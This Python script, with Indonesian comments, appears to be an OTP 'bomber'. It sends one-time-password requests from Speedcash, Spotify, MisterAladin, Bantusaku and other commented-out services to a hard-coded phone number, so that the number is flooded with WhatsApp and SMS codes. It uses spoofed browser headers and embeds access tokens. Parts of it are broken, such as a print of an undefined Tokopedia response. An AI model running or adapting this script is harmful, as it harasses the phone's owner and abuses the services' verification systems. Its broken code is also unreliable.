
import sys
import subprocess
from requests.exceptions import RequestException
try:
    import requests # Post, Get, & Put URL API
    import time     # Untuk informasi waktu
    import random   # Untuk random user
    import os       # Untuk "clear" terminal
    import urllib3  # HTTP client untuk Python
    import json     # Agar body requests dapat dilihat dengan cara di print
    import bs4      # Untuk variasi output
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'urllib3'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'bs4'])
finally:
    import requests # Post, Get, & Put URL API
    import urllib3  # HTTP client untuk Python
    from bs4 import BeautifulSoup as bs
    
from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"


    
nomor = '081385225385'
#nomor = int(input('Masukkan nomor: '))
#Input Nomor

z = 200
##                      WHATSAPP
#Tokopedia              =  requests.post('https://gql.tokopedia.com/graphql/OTPRequest', json=({'msisdn': nomor, 'otpType': "112", 'mode': "whatsapp", 'otpDigit': '6'}),  headers = {'Accept':'*/*', 'accept-encoding':'gzip, deflate, br, zstd', 'accept-language':'en-US,en;q=0.9', 'bd-device-id':'7456090867553551880', 'content-length':'851', 'content-type':'application/json', 'origin':'https://www.tokopedia.com', 'x-version':'9741c64', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-tkpd-lite-service':'zeus', 'referer':'https://www.tokopedia.com/?utm_source=google&utm_medium=cpc&utm_campaign=[SEM]:BR|Tokopedia_prf-tp-ID51MLAB01-0025-alon-alon&gad_source=1'})
#Duniagames            =  requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers={'Host':'api.duniagames.co.id','content-length':'50','accept':'application/json, text/plain, */*','sec-ch-ua-mobile':'?0','save-data':'on','user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36','content-type':'application/json','origin':'https://duniagames.co.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://duniagames.co.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},json={"phoneNumber":("0"+b),"inquiryId":"219424679"}).text
Speedcash              = requests.post('https://member.speedcash.co.id/api/twice/otp/generate', json=({"app_id": "SPEEDCASH", "appid": "SPEEDCASH", "location": "0,0", "phone":nomor, "state": "REGISTER", "type": "WA", "user_uuid": "8330e394-a601-5319-80a3-10e29f7db060", "uuid": "8330e394-a601-5319-80a3-10e29f7db060", "version_code": "270", "version_name": "3.2.0", "via": "BEBASBAYAR"}), headers={'Sec-Fetch-Site': 'same-origi', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Content-Length': '273', 'Content-Type': 'application/json', 'Host': 'member.speedcash.co.id', 'Origin': 'https://member.speedcash.co.id', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': "Windows", 'x-csrf-token': 'ccf319fb4b3938c7b7be3df374417ca7b5fa22634eea79ef6347dbca107f4549e2c7f20fe96455990bce1b7ce5d2e3ed741cac2c00732b364ece3483587e2765', 'Authorization': 'Bearer YzZmNDM2YzliYjVkMDE1Y2I4MDhmYjFlMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFlMDUwY2ZmMTY5MzVmZTMyZjIyOTM2ZmNmZjZhZmM4MDRhNjM2'} )
Spotify                = requests.post('https://accounts.spotify.com/login/phone/code/request', json=({'phonenumber': nomor}), headers={'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language':'en-US,en;q=0.9', 'Content-Length':'28', 'Content-Type':'application/x-www-form-urlencoded'})
Misteraladin           =  requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"}))

#Singa                   = requests.post("https://api102.singa.id/new/login/sendVoice?versionName=2.5.5&versionCode=151&model=21061110AG&systemVersion=13&platform=android&appsflyer_id=1736123993161-5829639520286301616", data={"mobile_phone":nomor}, headers={'uuId': 'ca61ecc3-45b7-48ce-8523-698d33f8544b', 'app_instance_id': '5b147c31a75a4cbbf54f8fb480ea3b19', 'Content-Type': 'application/json; charset=utf-8', 'Content-Length': '30', 'Host': 'api102.singa.id', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.9.1'})
#SingaWA                = requests.post("https://api102.singa.id/new/login/sendWaOtp?versionName=2.5.5&versionCode=151&model=21061110AG&systemVersion=13&platform=android&appsflyer_id=1736123993161-5829639520286301616", json={"mobile_phone":nomor,"type":"mobile","is_switchable":'0'}, headers={'uuId': 'ca61ecc3-45b7-48ce-8523-698d33f8544b', 'app_instance_id': '5b147c31a75a4cbbf54f8fb480ea3b19', 'Content-Type': 'application/json; charset=utf-8', 'Content-Length': '30', 'Host': 'api102.singa.id', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.9.1'})


##                      SMS
Bantusaku              = requests.post("https://p.bantusaku.id:8443/api/user/send-sms", data={"phone":nomor,"imageCode":"","uniquCode":"ffffffff-ee59-7e10-ffff-ffffef05ac4a48e7e6f39d01d17aunknown","type":"register","merchantNo":"BantuSaku"}, )













########################################################################################
if Speedcash.status_code ==200:
    print("Speedcash Sukses", Tokopedia.text)
else:
    print("Speedcash Error", Speedcash.status_code)

#if Tokopedia.status_code == 200:
#    print("Tokopedia Sukses")
#else:
#    print("Tokopedia Error", Tokopedia.status_code)

if Spotify.status_code == 200:
    print('Spotify Sukses')
else:
    print('Spotify Error', Spotify.status_code)

if Misteraladin.status_code == 200:
    print("Misteraladin Sukses")
else:
    print("MisterAladin Error", Misteraladin.status_code)

if Bantusaku.status_code == 200:
    print("Bantusaku Sukses")
else:
    print(Bantusaku.status_code)

#if Singa.status_code == 200:
#    print("Singa Error")     
#else:
#   print("Singa Error", Singa.status_code)



#if SingaWA.status_code == 200:
#    print("Singa Sukses")
#else:
#    print("Singa Error", SingaWA.status_code)

